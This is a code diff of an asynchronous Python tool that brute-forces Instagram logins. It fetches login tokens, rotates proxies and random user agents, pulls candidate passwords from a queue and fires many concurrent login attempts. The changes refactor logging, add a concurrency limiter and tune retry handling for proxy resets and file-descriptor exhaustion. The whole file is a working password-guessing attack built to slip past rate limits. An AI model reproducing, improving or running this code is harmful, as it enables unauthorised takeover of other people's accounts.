@@ -8,11 +8,35 @@ import random
 from app import settings
 from app.lib import exceptions
 from app.lib.utils import get_token_from_response, cancel_remaining_tasks
-from app.lib.logging import AppLogger, log_attempt_context, log_token_context
+from app.lib.logging import AppLogger, contextual_log
 from app.lib.models import InstagramResult, LoginAttemptContext, LoginContext, TokenContext
 
 
-log = AppLogger(__file__)
+from itertools import islice
+
+
+def limited_as_completed(coros, limit):
+
+    futures = [
+        asyncio.ensure_future(c)
+        for c in islice(coros, 0, limit)
+    ]
+
+    async def first_to_finish():
+        while True:
+            await asyncio.sleep(0)
+            for f in futures:
+                if f.done():
+                    futures.remove(f)
+                    try:
+                        newf = next(coros)
+                        futures.append(
+                            asyncio.ensure_future(newf))
+                    except StopIteration as e:
+                        pass
+                    return f.result()
+    while len(futures) > 0:
+        yield first_to_finish()
 
 
 class HandlerSettings(object):
@@ -43,9 +67,9 @@ class HandlerSettings(object):
 
 class request_handler(HandlerSettings):
 
-    def __init__(self, config, global_stop_event, proxy_handler):
+    def __init__(self, config, proxy_handler):
         self.config = config
-        self.global_stop_event = global_stop_event
+
         self.user_agent = random.choice(settings.USER_AGENTS)
         self.stop_event = asyncio.Event()
         self.proxy_handler = proxy_handler
@@ -109,9 +133,9 @@ class token_handler(request_handler):
             raise exceptions.TokenNotInResponse()
         return token
 
-    @log_token_context
+    @contextual_log
     async def request(self, session, context, retry=1):
-        log = AppLogger('Token Fetch')
+        log = AppLogger('Sending Token Request')
 
         self.log_get_request(context, log, retry=retry)
 
@@ -172,28 +196,19 @@ class token_handler(request_handler):
 
             Raises asyncio.TimeoutError if the timeout occurs before all Futures are done.
         """
-        context = None
         tasks = []
+        index = 0
+        log = AppLogger('Fetching Possible Tokens')
 
         async with aiohttp.ClientSession(
             connector=self.connector,
             timeout=self.timeout
         ) as session:
-            while not self.global_stop_event.is_set():
-                if context and context.index > self.FIRST_ATTEMPT_LIMIT:
-                    break
+            while index < self.FIRST_ATTEMPT_LIMIT:
 
                 proxy = await self.proxy_handler.get_best()
-
-                # Starts Index at 0
-                if not context:
-                    context = TokenContext(proxy=proxy)
-                else:
-                    # Increments Index and Uses New Proxy
-                    context = context.new(proxy)
-
-                if context.index > self.FIRST_ATTEMPT_LIMIT:
-                    break
+                context = TokenContext(proxy=proxy, index=index)
+                index += 1
 
                 log.info("Fetching Token")
                 task = asyncio.ensure_future(self.request(session, context))
@@ -212,8 +227,8 @@ class login_handler(request_handler):
 
     __handlername__ = 'login'
 
-    def __init__(self, config, global_stop_event, proxy_handler):
-        super(login_handler, self).__init__(config, global_stop_event, proxy_handler)
+    def __init__(self, config, proxy_handler):
+        super(login_handler, self).__init__(config, proxy_handler)
         self.user = self.config.user
 
     def _login_data(self, password):
@@ -235,7 +250,7 @@ class login_handler(request_handler):
         else:
             return InstagramResult.from_dict(result, context)
 
-    @log_attempt_context
+    @contextual_log
     async def _handle_client_response(self, response, context):
         """
         Takes the AIOHttp ClientResponse and tries to return a parsed
@@ -280,7 +295,7 @@ class login_handler(request_handler):
                 raise exceptions.InstagramResultError("Inconslusive result.")
             return result
 
-    @log_attempt_context
+    @contextual_log
     async def request(self, session, context, retry=1):
         """
         Do not want to automatically raise for status because we can have
@@ -290,8 +305,14 @@ class login_handler(request_handler):
         the response.json().
         """
         # Autologger not working because of keyword argument
-        log = AppLogger('Login Request')
+        log = AppLogger('Sending Login Request')
         self.log_post_request(context, log, retry=retry)
+
+        async def retry_request(e, time=1):
+            log.error(e, extra={'context': context})
+            log.warning(f'Sleeping for {time} Seconds...')
+            await asyncio.sleep(time)
+            return await self.request(session, context, retry=retry + 1)
 
         try:
             log.debug('Attempting Request')
@@ -324,41 +345,42 @@ class login_handler(request_handler):
                     return result
 
         except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
-            retry += 1
-
             # We probably want to lower this number
             if retry < self.MAX_REQUEST_RETRY_LIMIT:
-                # Session should still be alive.
-                log.info('Connection Error... Sleeping')
-                await asyncio.sleep(1)
-                log.info('Connection Error... Retrying')
-                return await self.request(session, context, retry=retry)
+                return await retry_request(e, time=1)
             else:
                 log.error(e, extra=context.log_context())
                 return None
 
         except OSError as e:
             # We have only seen this for the following:
-            # OSError: [Errno 24] Too many open files
-            # But for now it's safer to just sleep on the general exception than
-            # check for the exception code explicitly.
+            # >>> OSError: [Errno 24] Too many open files
+            # >>> OSError: [Errno 54] Connection reste by peer
+            # For the former, we want to sleep for a second, for the latter,
+            # we want to move on to a new proxy.
+            if e.errno == 54:
+                log.error(e, extra={'context': context})
+                return None
+            elif e.errno == 24:
+                if retry < self.MAX_REQUEST_RETRY_LIMIT:
+                    return await retry_request(e, time=3)
+                else:
+                    log.error(e, extra={'context': context})
+                    return None
+            else:
+                raise e
 
-            # TODO: Make sure that this isn't also a connection reset by peer
-            # exception, in which case we might want to not sleep but instead
-            # just return and move onto next proxy.
-            log.error(str(e), extra=context.log_context())
-            log.warning('Sleeping for %s Seconds...' % 5)
-            await asyncio.sleep(5)
-            return await self.request(session, context, retry=retry)
-
+        except asyncio.CancelledError as e:
+            return None
         except asyncio.TimeoutError as e:
-            log.error('TimeoutError')
+            log.error(e)
         except aiohttp.ClientError as e:
             log.error(e)
         except Exception as e:
-            raise exceptions.FatalException(f'Uncaught Exception: {str(e)}')
+            log.critical("Uncaught Exception %s" % e.__class__.__name__)
+            raise e
 
-    @log_attempt_context
+    @contextual_log
     async def attempt_login(self, session, context, results):
         """
         Instead of doing these one after another, we might be able to stagger
@@ -374,12 +396,12 @@ class login_handler(request_handler):
         Should we incorporate some type of limit here, so that we don't wind
         up trying to login with same password 100 times for safety?
         """
-        log = AppLogger('Login Attempt')
+        log = AppLogger('Attempting Login')
 
         stop_event = asyncio.Event()
         index = 0
 
-        while not self.global_stop_event.is_set() and not stop_event.is_set():
+        while not stop_event.is_set():
 
             proxy = await self.proxy_handler.get_best()
             context = LoginAttemptContext(
@@ -389,9 +411,7 @@ class login_handler(request_handler):
                 token=context.token
             )
             index += 1
-            log.info(context)
 
-            log.info('Attempting Login {}...'.format(context.password))
             result = await self.request(session, context)
 
             if result and result.conclusive:
@@ -425,32 +445,34 @@ class login_handler(request_handler):
         Incorporate timeout into asyncio.as_completed() just in case of situations
         where it could get caught.
         """
+        log = AppLogger("Consuming Passwords")
         if passwords.qsize() == 0:
             log.error('No Passwords to Consume')
             return
 
         tasks = []
         context = None
+        index = 0
 
         async with aiohttp.ClientSession(
             connector=self.connector,
             timeout=self.timeout
         ) as session:
-            while not passwords.empty():
+            while True:
                 # We might have to watch out for empty queue here.
                 password = await passwords.get()
                 log.debug(f'Got Password {password} from Queue')
 
-                if not context:
-                    # Starts Index at 0
-                    context = LoginContext(token=token, password=password)
-                else:
-                    # Increments Index and Uses New Password
-                    context = context.new(password)
+                context = LoginContext(
+                    index=index,
+                    token=token,
+                    password=password
+                )
 
                 log.debug('Creating Login Attempt Future', extra={'context': context})
-                task = asyncio.ensure_future(self.attempt_login(session, context, results))
+                task = asyncio.create_task(self.attempt_login(session, context, results))
                 tasks.append(task)
+                index += 1
 
             log.debug('Waiting for Attempts to Finish...')
             return await asyncio.gather(*tasks)
